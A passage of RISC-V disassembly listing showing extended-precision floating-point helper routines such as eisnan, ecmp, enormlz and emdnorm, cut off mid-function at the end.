   12de2:	0008d703          	lhu	a4,0(a7)
   12de6:	16f9                	addi	a3,a3,-2
   12de8:	18f9                	addi	a7,a7,-2
   12dea:	e705                	bnez	a4,12e12 <m16m+0x46>
   12dec:	fe069f23          	sh	zero,-2(a3)
   12df0:	ff1599e3          	bne	a1,a7,12de2 <m16m+0x16>
   12df4:	4791                	li	a5,4
   12df6:	4769                	li	a4,26
   12df8:	00f105b3          	add	a1,sp,a5
   12dfc:	0005d583          	lhu	a1,0(a1)
   12e00:	00f606b3          	add	a3,a2,a5
   12e04:	0789                	addi	a5,a5,2
   12e06:	00b69023          	sh	a1,0(a3)
   12e0a:	fee797e3          	bne	a5,a4,12df8 <m16m+0x2c>
   12e0e:	6105                	addi	sp,sp,32
   12e10:	8082                	ret
   12e12:	02a70733          	mul	a4,a4,a0
   12e16:	0026d803          	lhu	a6,2(a3)
   12e1a:	006777b3          	and	a5,a4,t1
   12e1e:	97c2                	add	a5,a5,a6
   12e20:	0107d813          	srli	a6,a5,0x10
   12e24:	00f69123          	sh	a5,2(a3)
   12e28:	01075793          	srli	a5,a4,0x10
   12e2c:	0006d703          	lhu	a4,0(a3)
   12e30:	97ba                	add	a5,a5,a4
   12e32:	97c2                	add	a5,a5,a6
   12e34:	00f69023          	sh	a5,0(a3)
   12e38:	83c1                	srli	a5,a5,0x10
   12e3a:	fef69f23          	sh	a5,-2(a3)
   12e3e:	bf4d                	j	12df0 <m16m+0x24>

0000000000012e40 <eisnan>:
   12e40:	01255783          	lhu	a5,18(a0)
   12e44:	fff7c793          	not	a5,a5
   12e48:	03179713          	slli	a4,a5,0x31
   12e4c:	eb09                	bnez	a4,12e5e <eisnan+0x1e>
   12e4e:	01250793          	addi	a5,a0,18
   12e52:	0509                	addi	a0,a0,2
   12e54:	ffe55703          	lhu	a4,-2(a0)
   12e58:	e709                	bnez	a4,12e62 <eisnan+0x22>
   12e5a:	fea79ce3          	bne	a5,a0,12e52 <eisnan+0x12>
   12e5e:	4501                	li	a0,0
   12e60:	8082                	ret
   12e62:	4505                	li	a0,1
   12e64:	8082                	ret

0000000000012e66 <eisneg>:
   12e66:	1141                	addi	sp,sp,-16
   12e68:	e022                	sd	s0,0(sp)
   12e6a:	e406                	sd	ra,8(sp)
   12e6c:	842a                	mv	s0,a0
   12e6e:	fd3ff0ef          	jal	ra,12e40 <eisnan>
   12e72:	e901                	bnez	a0,12e82 <eisneg+0x1c>
   12e74:	01344503          	lbu	a0,19(s0)
   12e78:	811d                	srli	a0,a0,0x7
   12e7a:	60a2                	ld	ra,8(sp)
   12e7c:	6402                	ld	s0,0(sp)
   12e7e:	0141                	addi	sp,sp,16
   12e80:	8082                	ret
   12e82:	4501                	li	a0,0
   12e84:	bfdd                	j	12e7a <eisneg+0x14>

0000000000012e86 <emovi>:
   12e86:	01251783          	lh	a5,18(a0)
   12e8a:	1101                	addi	sp,sp,-32
   12e8c:	ec06                	sd	ra,24(sp)
   12e8e:	e822                	sd	s0,16(sp)
   12e90:	e426                	sd	s1,8(sp)
   12e92:	e04a                	sd	s2,0(sp)
   12e94:	0407d963          	bgez	a5,12ee6 <emovi+0x60>
   12e98:	57fd                	li	a5,-1
   12e9a:	00f59023          	sh	a5,0(a1)
   12e9e:	01255703          	lhu	a4,18(a0)
   12ea2:	67a1                	lui	a5,0x8
   12ea4:	17fd                	addi	a5,a5,-1
   12ea6:	8f7d                	and	a4,a4,a5
   12ea8:	00e59123          	sh	a4,2(a1)
   12eac:	01050913          	addi	s2,a0,16
   12eb0:	04f71863          	bne	a4,a5,12f00 <emovi+0x7a>
   12eb4:	842e                	mv	s0,a1
   12eb6:	84aa                	mv	s1,a0
   12eb8:	f89ff0ef          	jal	ra,12e40 <eisnan>
   12ebc:	c905                	beqz	a0,12eec <emovi+0x66>
   12ebe:	00640793          	addi	a5,s0,6
   12ec2:	00041223          	sh	zero,4(s0)
   12ec6:	ffc48513          	addi	a0,s1,-4
   12eca:	1979                	addi	s2,s2,-2
   12ecc:	00295703          	lhu	a4,2(s2)
   12ed0:	0789                	addi	a5,a5,2
   12ed2:	fee79f23          	sh	a4,-2(a5) # 7ffe <_start-0x80b2>
   12ed6:	fea91ae3          	bne	s2,a0,12eca <emovi+0x44>
   12eda:	60e2                	ld	ra,24(sp)
   12edc:	6442                	ld	s0,16(sp)
   12ede:	64a2                	ld	s1,8(sp)
   12ee0:	6902                	ld	s2,0(sp)
   12ee2:	6105                	addi	sp,sp,32
   12ee4:	8082                	ret
   12ee6:	00059023          	sh	zero,0(a1)
   12eea:	bf55                	j	12e9e <emovi+0x18>
   12eec:	00440793          	addi	a5,s0,4
   12ef0:	01a40593          	addi	a1,s0,26
   12ef4:	0789                	addi	a5,a5,2
   12ef6:	fe079f23          	sh	zero,-2(a5)
   12efa:	feb79de3          	bne	a5,a1,12ef4 <emovi+0x6e>
   12efe:	bff1                	j	12eda <emovi+0x54>
   12f00:	00658793          	addi	a5,a1,6
   12f04:	00059223          	sh	zero,4(a1)
   12f08:	1579                	addi	a0,a0,-2
   12f0a:	1979                	addi	s2,s2,-2
   12f0c:	00295703          	lhu	a4,2(s2)
   12f10:	0789                	addi	a5,a5,2
   12f12:	fee79f23          	sh	a4,-2(a5)
   12f16:	fea91ae3          	bne	s2,a0,12f0a <emovi+0x84>
   12f1a:	00059c23          	sh	zero,24(a1)
   12f1e:	bf75                	j	12eda <emovi+0x54>

0000000000012f20 <ecmp>:
   12f20:	711d                	addi	sp,sp,-96
   12f22:	e4a6                	sd	s1,72(sp)
   12f24:	e0ca                	sd	s2,64(sp)
   12f26:	ec86                	sd	ra,88(sp)
   12f28:	e8a2                	sd	s0,80(sp)
   12f2a:	892a                	mv	s2,a0
   12f2c:	84ae                	mv	s1,a1
   12f2e:	f13ff0ef          	jal	ra,12e40 <eisnan>
   12f32:	e559                	bnez	a0,12fc0 <ecmp+0xa0>
   12f34:	8526                	mv	a0,s1
   12f36:	f0bff0ef          	jal	ra,12e40 <eisnan>
   12f3a:	842a                	mv	s0,a0
   12f3c:	e151                	bnez	a0,12fc0 <ecmp+0xa0>
   12f3e:	858a                	mv	a1,sp
   12f40:	854a                	mv	a0,s2
   12f42:	f45ff0ef          	jal	ra,12e86 <emovi>
   12f46:	100c                	addi	a1,sp,32
   12f48:	8526                	mv	a0,s1
   12f4a:	f3dff0ef          	jal	ra,12e86 <emovi>
   12f4e:	00015703          	lhu	a4,0(sp)
   12f52:	02015783          	lhu	a5,32(sp)
   12f56:	02e78c63          	beq	a5,a4,12f8e <ecmp+0x6e>
   12f5a:	4789                	li	a5,2
   12f5c:	46e1                	li	a3,24
   12f5e:	00f10633          	add	a2,sp,a5
   12f62:	00065603          	lhu	a2,0(a2) # ffffffffffff8000 <_end+0xffffffffffdc74d8>
   12f66:	e205                	bnez	a2,12f86 <ecmp+0x66>
   12f68:	1010                	addi	a2,sp,32
   12f6a:	963e                	add	a2,a2,a5
   12f6c:	00065603          	lhu	a2,0(a2)
   12f70:	ea19                	bnez	a2,12f86 <ecmp+0x66>
   12f72:	0789                	addi	a5,a5,2
   12f74:	fed795e3          	bne	a5,a3,12f5e <ecmp+0x3e>
   12f78:	8522                	mv	a0,s0
   12f7a:	60e6                	ld	ra,88(sp)
   12f7c:	6446                	ld	s0,80(sp)
   12f7e:	64a6                	ld	s1,72(sp)
   12f80:	6906                	ld	s2,64(sp)
   12f82:	6125                	addi	sp,sp,96
   12f84:	8082                	ret
   12f86:	4405                	li	s0,1
   12f88:	db65                	beqz	a4,12f78 <ecmp+0x58>
   12f8a:	547d                	li	s0,-1
   12f8c:	b7f5                	j	12f78 <ecmp+0x58>
   12f8e:	4605                	li	a2,1
   12f90:	c311                	beqz	a4,12f94 <ecmp+0x74>
   12f92:	567d                	li	a2,-1
   12f94:	4781                	li	a5,0
   12f96:	45e1                	li	a1,24
   12f98:	00f10733          	add	a4,sp,a5
   12f9c:	00075683          	lhu	a3,0(a4)
   12fa0:	1018                	addi	a4,sp,32
   12fa2:	973e                	add	a4,a4,a5
   12fa4:	00075703          	lhu	a4,0(a4)
   12fa8:	00e69663          	bne	a3,a4,12fb4 <ecmp+0x94>
   12fac:	0789                	addi	a5,a5,2
   12fae:	feb795e3          	bne	a5,a1,12f98 <ecmp+0x78>
   12fb2:	b7d9                	j	12f78 <ecmp+0x58>
   12fb4:	8432                	mv	s0,a2
   12fb6:	fcd761e3          	bltu	a4,a3,12f78 <ecmp+0x58>
   12fba:	40c0043b          	negw	s0,a2
   12fbe:	bf6d                	j	12f78 <ecmp+0x58>
   12fc0:	5479                	li	s0,-2
   12fc2:	bf5d                	j	12f78 <ecmp+0x58>

0000000000012fc4 <eisinf>:
   12fc4:	01255783          	lhu	a5,18(a0)
   12fc8:	fff7c793          	not	a5,a5
   12fcc:	03179713          	slli	a4,a5,0x31
   12fd0:	eb11                	bnez	a4,12fe4 <eisinf+0x20>
   12fd2:	1141                	addi	sp,sp,-16
   12fd4:	e406                	sd	ra,8(sp)
   12fd6:	e6bff0ef          	jal	ra,12e40 <eisnan>
   12fda:	60a2                	ld	ra,8(sp)
   12fdc:	00153513          	seqz	a0,a0
   12fe0:	0141                	addi	sp,sp,16
   12fe2:	8082                	ret
   12fe4:	4501                	li	a0,0
   12fe6:	8082                	ret

0000000000012fe8 <einfin.isra.2>:
   12fe8:	01250793          	addi	a5,a0,18
   12fec:	0509                	addi	a0,a0,2
   12fee:	fe051f23          	sh	zero,-2(a0)
   12ff2:	fef51de3          	bne	a0,a5,12fec <einfin.isra.2+0x4>
   12ff6:	00055783          	lhu	a5,0(a0)
   12ffa:	6721                	lui	a4,0x8
   12ffc:	177d                	addi	a4,a4,-1
   12ffe:	8fd9                	or	a5,a5,a4
   13000:	00f51023          	sh	a5,0(a0)
   13004:	8082                	ret

0000000000013006 <eshift.part.3>:
   13006:	7139                	addi	sp,sp,-64
   13008:	f822                	sd	s0,48(sp)
   1300a:	ec4e                	sd	s3,24(sp)
   1300c:	fc06                	sd	ra,56(sp)
   1300e:	f426                	sd	s1,40(sp)
   13010:	f04a                	sd	s2,32(sp)
   13012:	e852                	sd	s4,16(sp)
   13014:	e456                	sd	s5,8(sp)
   13016:	89aa                	mv	s3,a0
   13018:	842e                	mv	s0,a1
   1301a:	0a05d963          	bgez	a1,130cc <eshift.part.3+0xc6>
   1301e:	40b00a3b          	negw	s4,a1
   13022:	8952                	mv	s2,s4
   13024:	4481                	li	s1,0
   13026:	4abd                	li	s5,15
   13028:	034ac763          	blt	s5,s4,13056 <eshift.part.3+0x50>
   1302c:	0049591b          	srliw	s2,s2,0x4
   13030:	55c1                	li	a1,-16
   13032:	02b905bb          	mulw	a1,s2,a1
   13036:	4a1d                	li	s4,7
   13038:	4085893b          	subw	s2,a1,s0
   1303c:	844a                	mv	s0,s2
   1303e:	032a4463          	blt	s4,s2,13066 <eshift.part.3+0x60>
   13042:	0034559b          	srliw	a1,s0,0x3
   13046:	57e1                	li	a5,-8
   13048:	02f585bb          	mulw	a1,a1,a5
   1304c:	9c2d                	addw	s0,s0,a1
   1304e:	e405                	bnez	s0,13076 <eshift.part.3+0x70>
   13050:	00903533          	snez	a0,s1
   13054:	a09d                	j	130ba <eshift.part.3+0xb4>
   13056:	0189d783          	lhu	a5,24(s3)
   1305a:	854e                	mv	a0,s3
   1305c:	3a41                	addiw	s4,s4,-16
   1305e:	8cdd                	or	s1,s1,a5
   13060:	cfbff0ef          	jal	ra,12d5a <eshdn6>
   13064:	b7d1                	j	13028 <eshift.part.3+0x22>
   13066:	0189c783          	lbu	a5,24(s3)
   1306a:	854e                	mv	a0,s3
   1306c:	3961                	addiw	s2,s2,-8
   1306e:	8cdd                	or	s1,s1,a5
   13070:	c89ff0ef          	jal	ra,12cf8 <eshdn8>
   13074:	b7e9                	j	1303e <eshift.part.3+0x38>
   13076:	0189d783          	lhu	a5,24(s3)
   1307a:	854e                	mv	a0,s3
   1307c:	347d                	addiw	s0,s0,-1
   1307e:	8b85                	andi	a5,a5,1
   13080:	8cdd                	or	s1,s1,a5
   13082:	bfdff0ef          	jal	ra,12c7e <eshdn1>
   13086:	b7e1                	j	1304e <eshift.part.3+0x48>
   13088:	854e                	mv	a0,s3
   1308a:	cb5ff0ef          	jal	ra,12d3e <eshup6>
   1308e:	34c1                	addiw	s1,s1,-16
   13090:	fe994ce3          	blt	s2,s1,13088 <eshift.part.3+0x82>
   13094:	0044559b          	srliw	a1,s0,0x4
   13098:	57c1                	li	a5,-16
   1309a:	02f585bb          	mulw	a1,a1,a5
   1309e:	491d                	li	s2,7
   130a0:	00b404bb          	addw	s1,s0,a1
   130a4:	8426                	mv	s0,s1
   130a6:	02994663          	blt	s2,s1,130d2 <eshift.part.3+0xcc>
   130aa:	0034559b          	srliw	a1,s0,0x3
   130ae:	57e1                	li	a5,-8
   130b0:	02f585bb          	mulw	a1,a1,a5
   130b4:	9c2d                	addw	s0,s0,a1
   130b6:	e01d                	bnez	s0,130dc <eshift.part.3+0xd6>
   130b8:	4501                	li	a0,0
   130ba:	70e2                	ld	ra,56(sp)
   130bc:	7442                	ld	s0,48(sp)
   130be:	74a2                	ld	s1,40(sp)
   130c0:	7902                	ld	s2,32(sp)
   130c2:	69e2                	ld	s3,24(sp)
   130c4:	6a42                	ld	s4,16(sp)
   130c6:	6aa2                	ld	s5,8(sp)
   130c8:	6121                	addi	sp,sp,64
   130ca:	8082                	ret
   130cc:	84ae                	mv	s1,a1
   130ce:	493d                	li	s2,15
   130d0:	b7c1                	j	13090 <eshift.part.3+0x8a>
   130d2:	854e                	mv	a0,s3
   130d4:	c4bff0ef          	jal	ra,12d1e <eshup8>
   130d8:	34e1                	addiw	s1,s1,-8
   130da:	b7f1                	j	130a6 <eshift.part.3+0xa0>
   130dc:	854e                	mv	a0,s3
   130de:	bd9ff0ef          	jal	ra,12cb6 <eshup1>
   130e2:	347d                	addiw	s0,s0,-1
   130e4:	bfc9                	j	130b6 <eshift.part.3+0xb0>

00000000000130e6 <enormlz>:
   130e6:	00455783          	lhu	a5,4(a0)
   130ea:	1101                	addi	sp,sp,-32
   130ec:	e426                	sd	s1,8(sp)
   130ee:	ec06                	sd	ra,24(sp)
   130f0:	e822                	sd	s0,16(sp)
   130f2:	e04a                	sd	s2,0(sp)
   130f4:	84aa                	mv	s1,a0
   130f6:	efb9                	bnez	a5,13154 <enormlz+0x6e>
   130f8:	00651783          	lh	a5,6(a0)
   130fc:	4401                	li	s0,0
   130fe:	0a000913          	li	s2,160
   13102:	0007df63          	bgez	a5,13120 <enormlz+0x3a>
   13106:	8522                	mv	a0,s0
   13108:	60e2                	ld	ra,24(sp)
   1310a:	6442                	ld	s0,16(sp)
   1310c:	64a2                	ld	s1,8(sp)
   1310e:	6902                	ld	s2,0(sp)
   13110:	6105                	addi	sp,sp,32
   13112:	8082                	ret
   13114:	8526                	mv	a0,s1
   13116:	2441                	addiw	s0,s0,16
   13118:	c27ff0ef          	jal	ra,12d3e <eshup6>
   1311c:	ff2405e3          	beq	s0,s2,13106 <enormlz+0x20>
   13120:	0064d783          	lhu	a5,6(s1)
   13124:	dbe5                	beqz	a5,13114 <enormlz+0x2e>
   13126:	0064d783          	lhu	a5,6(s1)
   1312a:	f007f793          	andi	a5,a5,-256
   1312e:	cf91                	beqz	a5,1314a <enormlz+0x64>
   13130:	0a000913          	li	s2,160
   13134:	00649783          	lh	a5,6(s1)
   13138:	fc07c7e3          	bltz	a5,13106 <enormlz+0x20>
   1313c:	8526                	mv	a0,s1
   1313e:	2405                	addiw	s0,s0,1
   13140:	b77ff0ef          	jal	ra,12cb6 <eshup1>
   13144:	fe8958e3          	ble	s0,s2,13134 <enormlz+0x4e>
   13148:	bf7d                	j	13106 <enormlz+0x20>
   1314a:	8526                	mv	a0,s1
   1314c:	bd3ff0ef          	jal	ra,12d1e <eshup8>
   13150:	2421                	addiw	s0,s0,8
   13152:	bfd1                	j	13126 <enormlz+0x40>
   13154:	f007f793          	andi	a5,a5,-256
   13158:	4401                	li	s0,0
   1315a:	c781                	beqz	a5,13162 <enormlz+0x7c>
   1315c:	b9dff0ef          	jal	ra,12cf8 <eshdn8>
   13160:	5461                	li	s0,-8
   13162:	f7000913          	li	s2,-144
   13166:	a039                	j	13174 <enormlz+0x8e>
   13168:	8526                	mv	a0,s1
   1316a:	347d                	addiw	s0,s0,-1
   1316c:	b13ff0ef          	jal	ra,12c7e <eshdn1>
   13170:	f9244be3          	blt	s0,s2,13106 <enormlz+0x20>
   13174:	0044d783          	lhu	a5,4(s1)
   13178:	fbe5                	bnez	a5,13168 <enormlz+0x82>
   1317a:	b771                	j	13106 <enormlz+0x20>

000000000001317c <enan.constprop.12>:
   1317c:	01050793          	addi	a5,a0,16
   13180:	0509                	addi	a0,a0,2
   13182:	fe051f23          	sh	zero,-2(a0)
   13186:	fef51de3          	bne	a0,a5,13180 <enan.constprop.12+0x4>
   1318a:	77f1                	lui	a5,0xffffc
   1318c:	00f51023          	sh	a5,0(a0)
   13190:	77e1                	lui	a5,0xffff8
   13192:	fff7c793          	not	a5,a5
   13196:	00f51123          	sh	a5,2(a0)
   1319a:	8082                	ret

000000000001319c <emovo.isra.6>:
   1319c:	872a                	mv	a4,a0
   1319e:	00075683          	lhu	a3,0(a4) # 8000 <_start-0x80b0>
   131a2:	852e                	mv	a0,a1
   131a4:	00275783          	lhu	a5,2(a4)
   131a8:	c299                	beqz	a3,131ae <emovo.isra.6+0x12>
   131aa:	76e1                	lui	a3,0xffff8
   131ac:	8fd5                	or	a5,a5,a3
   131ae:	00f51923          	sh	a5,18(a0)
   131b2:	00275603          	lhu	a2,2(a4)
   131b6:	66a1                	lui	a3,0x8
   131b8:	16fd                	addi	a3,a3,-1
   131ba:	00670793          	addi	a5,a4,6
   131be:	00d61b63          	bne	a2,a3,131d4 <emovo.isra.6+0x38>
   131c2:	0769                	addi	a4,a4,26
   131c4:	0007d683          	lhu	a3,0(a5) # ffffffffffff8000 <_end+0xffffffffffdc74d8>
   131c8:	e28d                	bnez	a3,131ea <emovo.isra.6+0x4e>
   131ca:	0789                	addi	a5,a5,2
   131cc:	fee79ce3          	bne	a5,a4,131c4 <emovo.isra.6+0x28>
   131d0:	e19ff06f          	j	12fe8 <einfin.isra.2>
   131d4:	0541                	addi	a0,a0,16
   131d6:	0761                	addi	a4,a4,24
   131d8:	0789                	addi	a5,a5,2
   131da:	ffe7d683          	lhu	a3,-2(a5)
   131de:	1579                	addi	a0,a0,-2
   131e0:	00d51123          	sh	a3,2(a0)
   131e4:	fee79ae3          	bne	a5,a4,131d8 <emovo.isra.6+0x3c>
   131e8:	8082                	ret
   131ea:	f93ff06f          	j	1317c <enan.constprop.12>

00000000000131ee <e113toe.isra.8>:
   131ee:	7139                	addi	sp,sp,-64
   131f0:	f426                	sd	s1,40(sp)
   131f2:	84aa                	mv	s1,a0
   131f4:	850a                	mv	a0,sp
   131f6:	f822                	sd	s0,48(sp)
   131f8:	fc06                	sd	ra,56(sp)
   131fa:	842e                	mv	s0,a1
   131fc:	a2dff0ef          	jal	ra,12c28 <ecleaz>
   13200:	00e4d703          	lhu	a4,14(s1)
   13204:	0107179b          	slliw	a5,a4,0x10
   13208:	4107d79b          	sraiw	a5,a5,0x10
   1320c:	0207c763          	bltz	a5,1323a <e113toe.isra.8+0x4c>
   13210:	00011023          	sh	zero,0(sp)
   13214:	66a1                	lui	a3,0x8
   13216:	16fd                	addi	a3,a3,-1
   13218:	8f75                	and	a4,a4,a3
   1321a:	00e48793          	addi	a5,s1,14
   1321e:	04d71a63          	bne	a4,a3,13272 <e113toe.isra.8+0x84>
   13222:	8726                	mv	a4,s1
   13224:	00075683          	lhu	a3,0(a4)
   13228:	ce89                	beqz	a3,13242 <e113toe.isra.8+0x54>
   1322a:	8522                	mv	a0,s0
   1322c:	f51ff0ef          	jal	ra,1317c <enan.constprop.12>
   13230:	70e2                	ld	ra,56(sp)
   13232:	7442                	ld	s0,48(sp)
   13234:	74a2                	ld	s1,40(sp)
   13236:	6121                	addi	sp,sp,64
   13238:	8082                	ret
   1323a:	57fd                	li	a5,-1
   1323c:	00f11023          	sh	a5,0(sp)
   13240:	bfd1                	j	13214 <e113toe.isra.8+0x26>
   13242:	0709                	addi	a4,a4,2
   13244:	fee790e3          	bne	a5,a4,13224 <e113toe.isra.8+0x36>
   13248:	8522                	mv	a0,s0
   1324a:	9b9ff0ef          	jal	ra,12c02 <eclear>
   1324e:	8522                	mv	a0,s0
   13250:	d99ff0ef          	jal	ra,12fe8 <einfin.isra.2>
   13254:	00e49783          	lh	a5,14(s1)
   13258:	fc07dce3          	bgez	a5,13230 <e113toe.isra.8+0x42>
   1325c:	8522                	mv	a0,s0
   1325e:	be3ff0ef          	jal	ra,12e40 <eisnan>
   13262:	f579                	bnez	a0,13230 <e113toe.isra.8+0x42>
   13264:	01245783          	lhu	a5,18(s0)
   13268:	7761                	lui	a4,0xffff8
   1326a:	8fb9                	xor	a5,a5,a4
   1326c:	00f41923          	sh	a5,18(s0)
   13270:	b7c1                	j	13230 <e113toe.isra.8+0x42>
   13272:	00e11123          	sh	a4,2(sp)
   13276:	868a                	mv	a3,sp
   13278:	17f9                	addi	a5,a5,-2
   1327a:	0007d603          	lhu	a2,0(a5)
   1327e:	0689                	addi	a3,a3,2
   13280:	00c69223          	sh	a2,4(a3) # 8004 <_start-0x80ac>
   13284:	fef49ae3          	bne	s1,a5,13278 <e113toe.isra.8+0x8a>
   13288:	eb01                	bnez	a4,13298 <e113toe.isra.8+0xaa>
   1328a:	00011223          	sh	zero,4(sp)
   1328e:	85a2                	mv	a1,s0
   13290:	850a                	mv	a0,sp
   13292:	f0bff0ef          	jal	ra,1319c <emovo.isra.6>
   13296:	bf69                	j	13230 <e113toe.isra.8+0x42>
   13298:	4785                	li	a5,1
   1329a:	55fd                	li	a1,-1
   1329c:	850a                	mv	a0,sp
   1329e:	00f11223          	sh	a5,4(sp)
   132a2:	d65ff0ef          	jal	ra,13006 <eshift.part.3>
   132a6:	b7e5                	j	1328e <e113toe.isra.8+0xa0>

00000000000132a8 <emdnorm>:
   132a8:	7139                	addi	sp,sp,-64
   132aa:	f822                	sd	s0,48(sp)
   132ac:	f426                	sd	s1,40(sp)
   132ae:	f04a                	sd	s2,32(sp)
   132b0:	ec4e                	sd	s3,24(sp)
   132b2:	e852                	sd	s4,16(sp)
   132b4:	e456                	sd	s5,8(sp)
   132b6:	8936                	mv	s2,a3
   132b8:	843e                	mv	s0,a5
   132ba:	fc06                	sd	ra,56(sp)
   132bc:	84aa                	mv	s1,a0
   132be:	89ae                	mv	s3,a1
   132c0:	8a32                	mv	s4,a2
   132c2:	8aba                	mv	s5,a4
   132c4:	e23ff0ef          	jal	ra,130e6 <enormlz>
   132c8:	09000793          	li	a5,144
   132cc:	40a90933          	sub	s2,s2,a0
   132d0:	02a7d763          	ble	a0,a5,132fe <emdnorm+0x56>
   132d4:	67a1                	lui	a5,0x8
   132d6:	17f9                	addi	a5,a5,-2
   132d8:	2327c663          	blt	a5,s2,13504 <emdnorm+0x25c>
   132dc:	00248793          	addi	a5,s1,2
   132e0:	04e9                	addi	s1,s1,26
   132e2:	0789                	addi	a5,a5,2
   132e4:	fe079f23          	sh	zero,-2(a5) # 7ffe <_start-0x80b2>
   132e8:	fe979de3          	bne	a5,s1,132e2 <emdnorm+0x3a>
   132ec:	70e2                	ld	ra,56(sp)
   132ee:	7442                	ld	s0,48(sp)
   132f0:	74a2                	ld	s1,40(sp)
   132f2:	7902                	ld	s2,32(sp)
   132f4:	69e2                	ld	s3,24(sp)
   132f6:	6a42                	ld	s4,16(sp)
   132f8:	6aa2                	ld	s5,8(sp)
   132fa:	6121                	addi	sp,sp,64
   132fc:	8082                	ret
   132fe:	00095d63          	bgez	s2,13318 <emdnorm+0x70>
   13302:	f7000793          	li	a5,-144
   13306:	0ef94a63          	blt	s2,a5,133fa <emdnorm+0x152>
   1330a:	0009059b          	sext.w	a1,s2
   1330e:	8526                	mv	a0,s1
   13310:	cf7ff0ef          	jal	ra,13006 <eshift.part.3>
   13314:	0e051c63          	bnez	a0,1340c <emdnorm+0x164>
   13318:	1a0a8a63          	beqz	s5,134cc <emdnorm+0x224>
   1331c:	4058                	lw	a4,4(s0)
   1331e:	401c                	lw	a5,0(s0)
   13320:	04f70863          	beq	a4,a5,13370 <emdnorm+0xc8>
   13324:	01a40513          	addi	a0,s0,26
   13328:	901ff0ef          	jal	ra,12c28 <ecleaz>
   1332c:	405c                	lw	a5,4(s0)
   1332e:	03800713          	li	a4,56
   13332:	10e78d63          	beq	a5,a4,1344c <emdnorm+0x1a4>
   13336:	0cf74d63          	blt	a4,a5,13410 <emdnorm+0x168>
   1333a:	4761                	li	a4,24
   1333c:	12e78e63          	beq	a5,a4,13478 <emdnorm+0x1d0>
   13340:	03500713          	li	a4,53
   13344:	12e78163          	beq	a5,a4,13466 <emdnorm+0x1be>
   13348:	80010737          	lui	a4,0x80010
   1334c:	377d                	addiw	a4,a4,-1
   1334e:	c858                	sw	a4,20(s0)
   13350:	4705                	li	a4,1
   13352:	00e41c23          	sh	a4,24(s0)
   13356:	472d                	li	a4,11
   13358:	1702                	slli	a4,a4,0x20
   1335a:	0731                	addi	a4,a4,12
   1335c:	e418                	sd	a4,8(s0)
   1335e:	4458                	lw	a4,12(s0)
   13360:	01845683          	lhu	a3,24(s0)
   13364:	0721                	addi	a4,a4,8
   13366:	0706                	slli	a4,a4,0x1
   13368:	9722                	add	a4,a4,s0
   1336a:	00d71523          	sh	a3,10(a4) # ffffffff8001000a <_end+0xffffffff7fddf4e2>
   1336e:	c01c                	sw	a5,0(s0)
   13370:	01204f63          	bgtz	s2,1338e <emdnorm+0xe6>
   13374:	4058                	lw	a4,4(s0)
   13376:	09000793          	li	a5,144
   1337a:	00f70a63          	beq	a4,a5,1338e <emdnorm+0xe6>
   1337e:	0184d783          	lhu	a5,24(s1)
   13382:	8526                	mv	a0,s1
   13384:	8b85                	andi	a5,a5,1
   13386:	00f9e9b3          	or	s3,s3,a5
   1338a:	8f5ff0ef          	jal	ra,12c7e <eshdn1>
   1338e:	4414                	lw	a3,8(s0)
   13390:	01445583          	lhu	a1,20(s0)
   13394:	4048                	lw	a0,4(s0)
   13396:	00169793          	slli	a5,a3,0x1
   1339a:	00f48633          	add	a2,s1,a5
   1339e:	00065703          	lhu	a4,0(a2)
   133a2:	8f6d                	and	a4,a4,a1
   133a4:	08f00593          	li	a1,143
   133a8:	00a5c863          	blt	a1,a0,133b8 <emdnorm+0x110>
   133ac:	0789                	addi	a5,a5,2
   133ae:	2685                	addiw	a3,a3,1
   133b0:	97a6                	add	a5,a5,s1
   133b2:	45b1                	li	a1,12
   133b4:	0cd5df63          	ble	a3,a1,13492 <emdnorm+0x1ea>
   133b8:	01445783          	lhu	a5,20(s0)
   133bc:	00065683          	lhu	a3,0(a2)
   133c0:	fff7c793          	not	a5,a5
   133c4:	8ff5                	and	a5,a5,a3
   133c6:	00f61023          	sh	a5,0(a2)
   133ca:	01645783          	lhu	a5,22(s0)
   133ce:	00e7f6b3          	and	a3,a5,a4
   133d2:	cee1                	beqz	a3,134aa <emdnorm+0x202>
   133d4:	00e79d63          	bne	a5,a4,133ee <emdnorm+0x146>
   133d8:	0c099763          	bnez	s3,134a6 <emdnorm+0x1fe>
   133dc:	445c                	lw	a5,12(s0)
   133de:	01845703          	lhu	a4,24(s0)
   133e2:	0786                	slli	a5,a5,0x1
   133e4:	97a6                	add	a5,a5,s1
   133e6:	0007d783          	lhu	a5,0(a5)
   133ea:	8ff9                	and	a5,a5,a4
   133ec:	cfdd                	beqz	a5,134aa <emdnorm+0x202>
   133ee:	85a6                	mv	a1,s1
   133f0:	01a40513          	addi	a0,s0,26
   133f4:	989ff0ef          	jal	ra,12d7c <eaddm>
   133f8:	a84d                	j	134aa <emdnorm+0x202>
   133fa:	00248793          	addi	a5,s1,2
   133fe:	04e9                	addi	s1,s1,26
   13400:	0789                	addi	a5,a5,2
   13402:	fe079f23          	sh	zero,-2(a5)
   13406:	fe979de3          	bne	a5,s1,13400 <emdnorm+0x158>
   1340a:	b5cd                	j	132ec <emdnorm+0x44>
   1340c:	4985                	li	s3,1
   1340e:	b729                	j	13318 <emdnorm+0x70>
   13410:	04000713          	li	a4,64
   13414:	02e78163          	beq	a5,a4,13436 <emdnorm+0x18e>
   13418:	07100713          	li	a4,113
   1341c:	f2e796e3          	bne	a5,a4,13348 <emdnorm+0xa0>
   13420:	40008737          	lui	a4,0x40008
   13424:	377d                	addiw	a4,a4,-1
   13426:	c858                	sw	a4,20(s0)
   13428:	7761                	lui	a4,0xffff8
   1342a:	00e41c23          	sh	a4,24(s0)
   1342e:	4729                	li	a4,10
   13430:	1702                	slli	a4,a4,0x20
   13432:	0729                	addi	a4,a4,10
   13434:	b725                	j	1335c <emdnorm+0xb4>
   13436:	80010737          	lui	a4,0x80010
   1343a:	377d                	addiw	a4,a4,-1
   1343c:	c858                	sw	a4,20(s0)
   1343e:	4705                	li	a4,1
   13440:	00e41c23          	sh	a4,24(s0)
   13444:	470d                	li	a4,3
   13446:	1706                	slli	a4,a4,0x21
   13448:	071d                	addi	a4,a4,7
   1344a:	bf09                	j	1335c <emdnorm+0xb4>
   1344c:	00800737          	lui	a4,0x800
   13450:	0ff7071b          	addiw	a4,a4,255
   13454:	c858                	sw	a4,20(s0)
   13456:	10000713          	li	a4,256
   1345a:	00e41c23          	sh	a4,24(s0)
   1345e:	4719                	li	a4,6
   13460:	1702                	slli	a4,a4,0x20
   13462:	0719                	addi	a4,a4,6
   13464:	bde5                	j	1335c <emdnorm+0xb4>
   13466:	04000737          	lui	a4,0x4000
   1346a:	7ff7071b          	addiw	a4,a4,2047
